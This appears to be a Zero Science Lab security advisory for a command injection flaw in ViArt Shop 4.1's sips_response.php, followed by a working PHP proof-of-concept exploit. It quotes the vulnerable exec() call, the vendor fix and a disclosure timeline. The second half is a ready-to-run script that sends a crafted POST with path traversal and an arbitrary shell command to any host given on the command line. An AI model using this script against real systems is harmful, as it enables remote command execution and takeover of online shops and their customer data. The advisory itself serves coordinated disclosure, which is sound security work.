@@ -1,0 +1,123 @@
+<?php
+
+/*
+
+ViArt Shop Enterprise 4.1 Arbitrary Command Execution Vulnerability
+
+
+Vendor: ViArt Software
+Product web page: http://www.viart.com
+Affected version: 4.1, 4.0.8, 4.0.5
+
+Summary: Viart Shop is a PHP based e-commerce suite, aiming to provide
+everything you need to run a successful on-line business.
+
+Desc: Input passed to the 'DATA' POST parameter in 'sips_response.php'
+is not properly sanitised before being used to process product payment
+data. This can be exploited to execute arbitrary commands via specially
+crafted requests.
+
+Condition: register_globals=On
+
+=======================================================================
+Vuln:
+-----
+/payments/sips_response.php:
+----------------------------
+
+16: if (isset($_POST['DATA'])) {
+17:
+18:     $params  = " message=" . $_POST['DATA'];
+19:     $params .= " pathfile=" .  $payment_params['pathfile'];
+20:     exec($payment_params['path_bin_resp'] . $params, $result);
+
+-----------------------------------------------------------------------
+Fix:
+----
+/payments/sips_response.php:
+----------------------------
+
+5: if (!defined("VA_PRODUCT")) {
+6:     header ("Location: ../index.php");
+7:     exit;
+8: }
+9:
+10: if (isset($_POST['DATA'])) {
+11:
+12:     $params  = " message=" . $_POST['DATA'];
+13:     $params .= " pathfile=" .  $payment_params['pathfile'];
+14:     exec($payment_params['path_bin_resp'] . $params, $result);
+
+=======================================================================
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+Vendor status:
+
+[09.09.2012] Vulnerability discovered.
+[24.09.2012] Contact with the vendor.
+[24.09.2012] Vendor responds asking more details.
+[24.09.2012] Sent detailed information to the vendor.
+[25.09.2012] Vendor confirms the vulnerability, issuing patch (http://www.viart.com/downloads/sips_response.zip).
+[25.09.2012] Coordinated public security advisory released.
+
+
+Advisory ID: ZSL-2012-5109
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5109.php
+
+Vendor: http://www.viart.com/downloads/viart_shop-4.1.zip
+
+
+09.09.2012
+
+*/
+
+
+error_reporting(0);
+
+print "\n-----------------------------------------------------------";
+print "\n\n ViArt Shop Enterprise 4.1 Remote Command Execution\n\n";
+print "\t\tID: ZSL-2012-5109\n\n";
+print "-----------------------------------------------------------\n";
+
+if ($argc < 2)
+{
+    print "\n\n\x20[*] Usage: php $argv[0] <host> <cmd>\n\n";
+    print "\x20[*] Example: php $argv[0] localhost windows%2Fsystem32%2Fcalc.exe\n\n";
+    die();
+}
+
+$host = $argv[1];
+$cmd = $argv[2];
+$sock = fsockopen($host,80);
+
+$post = "DATA=..%2F..%2F..%2F..%2F..%2F{$cmd}";
+$duz = strlen($post);
+
+$data = "POST http://{$host}/payments/sips_response.php HTTP/1.1\r\n".
+        "Host: {$host}\r\n".
+        "User-Agent: Mozilla/5.0\r\n".
+        "Content-Type: application/x-www-form-urlencoded\r\n".
+        "Accept-Encoding: gzip,deflate\r\n".
+        "Content-Length: {$duz}\r\n\r\n{$post}\r\n\r\n";
+
+fputs($sock,$data);
+while(!feof($sock))
+{
+    $html .= fgets($sock);
+}
+fclose($sock);
+echo "\n" . $html;
+
+?>
